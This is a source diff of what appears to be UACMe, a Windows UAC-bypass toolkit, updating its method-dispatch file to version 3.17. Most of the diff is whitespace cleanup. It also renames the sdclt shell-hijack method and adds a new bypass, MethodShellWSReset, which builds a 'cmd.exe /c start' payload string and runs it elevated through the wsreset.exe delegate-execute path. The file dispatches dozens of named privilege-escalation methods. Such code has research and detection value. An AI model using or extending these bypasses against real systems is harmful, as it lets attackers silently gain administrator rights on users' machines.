@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.16
+*  VERSION:     3.17
 *
-*  DATE:        11 Mar 2019
+*  DATE:        16 Mar 2019
 *
 *  UAC bypass dispatch.
 *
@@ -65,9 +65,10 @@ UCM_API(MethodCreateNewLink);
 UCM_API(MethodDateTimeStateWriter);
 UCM_API(MethodAcCplAdmin);
 UCM_API(MethodDirectoryMock);
-UCM_API(MethodCOMSdctl);
+UCM_API(MethodShellSdctl);
 UCM_API(MethodEgre55);
 UCM_API(MethodTokenModUIAccess);
+UCM_API(MethodShellWSReset);
 
 UCM_EXTRA_CONTEXT WDCallbackType1;
 
@@ -134,9 +135,10 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodDateTimeStateWriter, NULL, { 7600, 17763 }, CHIYODA_ID, FALSE, TRUE, TRUE },
     { MethodAcCplAdmin, NULL, { 7600, 17134 }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodDirectoryMock, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodCOMSdctl, NULL, { 14393, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodShellSdctl, NULL, { 14393, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodEgre55, NULL, { 14393, MAXDWORD }, FUBUKI_ID, TRUE, FALSE, TRUE },
-    { MethodTokenModUIAccess, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, FALSE }
+    { MethodTokenModUIAccess, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, FALSE },
+    { MethodShellWSReset, NULL, { 17134, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }
 };
 
 #define WDCallbackType1MagicVer 282647531814912
@@ -352,6 +354,10 @@ VOID PostCleanupAttempt(
         ucmSXSDccwMethodCleanup();
         break;
 
+    case UacMethodHakril:
+        ucmHakrilMethodCleanup();
+        break;
+
     default:
         break;
     }
@@ -375,7 +381,7 @@ BOOL MethodsManagerCall(
     PVOID  ImageBaseAddress = g_hInstance;
     PUCM_API_DISPATCH_ENTRY Entry;
     PUCM_EXTRA_CONTEXT ExtraContext;
-    
+
     UCM_PARAMS_BLOCK ParamsBlock;
     LARGE_INTEGER liDueTime;
 
@@ -446,7 +452,7 @@ BOOL MethodsManagerCall(
     // Wait a little bit for completion.
     //
     if (Entry->SetParameters) {
-        if (bParametersBlockSet) {           
+        if (bParametersBlockSet) {
             if (g_ctx->SharedContext.hCompletionEvent) {
                 liDueTime.QuadPart = -(LONGLONG)UInt32x32To64(200000, 10000);
                 NtWaitForSingleObject(g_ctx->SharedContext.hCompletionEvent, FALSE, &liDueTime);
@@ -483,8 +489,8 @@ UCM_API(MethodTest)
 UCM_API(MethodSysprep)
 {
     return ucmStandardAutoElevation(
-        Parameter->Method, 
-        Parameter->PayloadCode, 
+        Parameter->Method,
+        Parameter->PayloadCode,
         Parameter->PayloadSize);
 }
 
@@ -510,7 +516,7 @@ UCM_API(MethodACBinaryPath)
     return FALSE;
 #else
     return ucmShimPatch(
-        Parameter->PayloadCode, 
+        Parameter->PayloadCode,
         Parameter->PayloadSize);
 #endif
 }
@@ -545,15 +551,15 @@ UCM_API(MethodCarberp)
         }
     }
     return ucmWusaMethod(
-        Parameter->Method, 
-        Parameter->PayloadCode, 
+        Parameter->Method,
+        Parameter->PayloadCode,
         Parameter->PayloadSize);
 }
 
 UCM_API(MethodAVrf)
 {
     return ucmAvrfMethod(
-        Parameter->PayloadCode, 
+        Parameter->PayloadCode,
         Parameter->PayloadSize);
 }
 
@@ -579,9 +585,9 @@ UCM_API(MethodWinsat)
     UseWusa = (g_ctx->dwBuildNumber <= 10136);
 
     return ucmWinSATMethod(
-        lpFileName, 
-        Parameter->PayloadCode, 
-        Parameter->PayloadSize, 
+        lpFileName,
+        Parameter->PayloadCode,
+        Parameter->PayloadSize,
         UseWusa);
 }
 
@@ -592,9 +598,9 @@ UCM_API(MethodMMC)
     //
 #ifdef _WIN64
     return ucmMMCMethod(
-        Parameter->Method, 
-        ELSEXT_DLL, 
-        Parameter->PayloadCode, 
+        Parameter->Method,
+        ELSEXT_DLL,
+        Parameter->PayloadCode,
         Parameter->PayloadSize);
 #else
     UNREFERENCED_PARAMETER(Parameter);
@@ -606,16 +612,16 @@ UCM_API(MethodMMC)
 UCM_API(MethodMMC2)
 {
     return ucmMMCMethod(
-        Parameter->Method, 
-        WBEMCOMN_DLL, 
-        Parameter->PayloadCode, 
+        Parameter->Method,
+        WBEMCOMN_DLL,
+        Parameter->PayloadCode,
         Parameter->PayloadSize);
 }
 
 UCM_API(MethodSirefef)
 {
     return ucmSirefefMethod(
-        Parameter->PayloadCode, 
+        Parameter->PayloadCode,
         Parameter->PayloadSize);
 }
 
@@ -628,30 +634,30 @@ UCM_API(MethodGeneric)
     _strcat(szBuffer, CLICONFG_EXE);
 
     return ucmGenericAutoelevation(
-        szBuffer, 
-        NTWDBLIB_DLL, 
-        Parameter->PayloadCode, 
+        szBuffer,
+        NTWDBLIB_DLL,
+        Parameter->PayloadCode,
         Parameter->PayloadSize);
 }
 
 UCM_API(MethodGWX)
 {
     return ucmGWX(
-        Parameter->PayloadCode, 
+        Parameter->PayloadCode,
         Parameter->PayloadSize);
 }
 
 UCM_API(MethodSysprep4)
 {
     return ucmStandardAutoElevation2(
-        Parameter->PayloadCode, 
+        Parameter->PayloadCode,
         Parameter->PayloadSize);
 }
 
 UCM_API(MethodManifest)
 {
     return ucmAutoElevateManifest(
-        Parameter->PayloadCode, 
+        Parameter->PayloadCode,
         Parameter->PayloadSize);
 }
 
@@ -722,7 +728,7 @@ UCM_API(MethodSXS)
 UCM_API(MethodDism)
 {
     return ucmDismMethod(
-        Parameter->PayloadCode, 
+        Parameter->PayloadCode,
         Parameter->PayloadSize);
 }
 
@@ -765,16 +771,16 @@ UCM_API(MethodEnigma0x3)
         lpszPayload = NULL;
 
     return ucmHijackShellCommandMethod(
-        lpszPayload, 
-        lpszTargetApp, 
-        Parameter->PayloadCode, 
+        lpszPayload,
+        lpszTargetApp,
+        Parameter->PayloadCode,
         Parameter->PayloadSize);
 }
 
 UCM_API(MethodEnigma0x3_2)
 {
     return ucmDiskCleanupRaceCondition(
-        Parameter->PayloadCode, 
+        Parameter->PayloadCode,
         Parameter->PayloadSize);
 }
 
@@ -798,7 +804,7 @@ UCM_API(MethodExpLife)
 UCM_API(MethodSandworm)
 {
     return ucmSandwormMethod(
-        Parameter->PayloadCode, 
+        Parameter->PayloadCode,
         Parameter->PayloadSize);
 }
 
@@ -817,8 +823,8 @@ UCM_API(MethodEnigma0x3_3)
         lpszPayload = g_ctx->szOptionalParameter;
 
     return ucmAppPathMethod(
-        lpszPayload, 
-        CONTROL_EXE, 
+        lpszPayload,
+        CONTROL_EXE,
         SDCLT_EXE);
 }
 
@@ -829,7 +835,7 @@ UCM_API(MethodWow64Logger)
     //
 #ifdef _WIN64
     return ucmWow64LoggerMethod(
-        Parameter->PayloadCode, 
+        Parameter->PayloadCode,
         Parameter->PayloadSize);
 #else
     UNREFERENCED_PARAMETER(Parameter);
@@ -855,7 +861,7 @@ UCM_API(MethodEnigma0x3_4)
 UCM_API(MethodUiAccess)
 {
     return ucmUiAccessMethod(
-        Parameter->PayloadCode, 
+        Parameter->PayloadCode,
         Parameter->PayloadSize);
 }
 
@@ -910,21 +916,21 @@ UCM_API(MethodTokenMod)
     }
 
     return ucmTokenModification(
-        lpszPayload, 
+        lpszPayload,
         fUseCommandLine);
 }
 
 UCM_API(MethodJunction)
 {
     return ucmJunctionMethod(
-        Parameter->PayloadCode, 
+        Parameter->PayloadCode,
         Parameter->PayloadSize);
 }
 
 UCM_API(MethodSXSDccw)
 {
     return ucmSXSDccwMethod(
-        Parameter->PayloadCode, 
+        Parameter->PayloadCode,
         Parameter->PayloadSize);
 }
 
@@ -932,7 +938,7 @@ UCM_API(MethodHakril)
 {
 #ifdef _WIN64
     return ucmHakrilMethod(
-        Parameter->PayloadCode, 
+        Parameter->PayloadCode,
         Parameter->PayloadSize);
 #else
     UNREFERENCED_PARAMETER(Parameter);
@@ -944,14 +950,14 @@ UCM_API(MethodHakril)
 UCM_API(MethodCorProfiler)
 {
     return ucmCorProfilerMethod(
-        Parameter->PayloadCode, 
+        Parameter->PayloadCode,
         Parameter->PayloadSize);
 }
 
 UCM_API(MethodCOMHandlers)
 {
     return ucmCOMHandlersMethod(
-        Parameter->PayloadCode, 
+        Parameter->PayloadCode,
         Parameter->PayloadSize);
 }
 
@@ -1009,7 +1015,7 @@ UCM_API(MethodDccwCOM)
 UCM_API(MethodVolatileEnv)
 {
     return ucmVolatileEnvMethod(
-        Parameter->PayloadCode, 
+        Parameter->PayloadCode,
         Parameter->PayloadSize);
 }
 
@@ -1050,14 +1056,14 @@ UCM_API(MethodBitlockerRC)
 UCM_API(MethodCOMHandlers2)
 {
     return ucmCOMHandlersMethod2(
-        Parameter->PayloadCode, 
+        Parameter->PayloadCode,
         Parameter->PayloadSize);
 }
 
 UCM_API(MethodSPPLUAObject)
 {
     return ucmSPPLUAObjectMethod(
-        Parameter->PayloadCode, 
+        Parameter->PayloadCode,
         Parameter->PayloadSize);
 }
 
@@ -1104,18 +1110,24 @@ UCM_API(MethodDirectoryMock)
         Parameter->PayloadSize);
 }
 
-UCM_API(MethodCOMSdctl)
+UCM_API(MethodShellSdctl)
 {
-    LPWSTR lpszPayload = NULL;
+    LPWSTR Payload = NULL;
 
     UNREFERENCED_PARAMETER(Parameter);
 
     if (g_ctx->OptionalParameterLength == 0)
-        lpszPayload = g_ctx->szDefaultPayload;
+        Payload = g_ctx->szDefaultPayload;
     else
-        lpszPayload = g_ctx->szOptionalParameter;
+        Payload = g_ctx->szOptionalParameter;
 
-    return ucmSdcltDelegateExecuteCommandMethod(lpszPayload);
+    return ucmShellDelegateExecuteCommandMethod(
+        SDCLT_EXE,
+        _strlen(SDCLT_EXE),
+        T_CLASSESFOLDER,
+        _strlen(T_CLASSESFOLDER),
+        Payload,
+        _strlen(Payload));
 }
 
 UCM_API(MethodEgre55)
@@ -1135,4 +1147,41 @@ UCM_API(MethodTokenModUIAccess)
 {
     return ucmTokenModUIAccessMethod(Parameter->PayloadCode,
         Parameter->PayloadSize);
+}
+
+UCM_API(MethodShellWSReset)
+{
+    ULONG Result = 0;
+    LPWSTR PayloadParameter = NULL, PayloadFinal = NULL;
+    SIZE_T Size;
+
+    UNREFERENCED_PARAMETER(Parameter);
+
+
+    if (g_ctx->OptionalParameterLength == 0)
+        PayloadParameter = g_ctx->szDefaultPayload;
+    else
+        PayloadParameter = g_ctx->szOptionalParameter;
+
+    Size = ((MAX_PATH * 2) + _strlen(PayloadParameter)) * sizeof(WCHAR);
+    PayloadFinal = supHeapAlloc(Size);
+    if (PayloadFinal) {
+
+        _strcpy(PayloadFinal, g_ctx->szSystemDirectory);
+        _strcat(PayloadFinal, CMD_EXE);
+        _strcat(PayloadFinal, TEXT(" /c start "));
+        _strcat(PayloadFinal, PayloadParameter);
+
+        Result = ucmShellDelegateExecuteCommandMethod(
+            WSRESET_EXE,
+            _strlen(WSRESET_EXE),
+            T_APPXPACKAGE,
+            _strlen(T_APPXPACKAGE),
+            PayloadFinal,
+            _strlen(PayloadFinal));
+
+        supHeapFree(PayloadFinal);
+    }
+
+    return Result;
 }
